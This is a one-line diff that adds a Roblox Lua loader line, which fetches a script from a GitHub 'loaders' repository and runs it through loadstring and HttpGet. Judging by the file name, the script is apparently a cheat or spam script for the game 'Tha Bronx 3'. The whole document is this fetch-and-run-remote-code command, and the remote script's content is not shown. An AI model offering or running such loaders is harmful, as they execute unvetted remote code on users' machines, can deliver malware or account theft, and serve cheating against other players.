@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Swarmzorouter/loaders/main/loaders/tha-bronx-3-spam2-8w64pysmofgdef.lua"))()
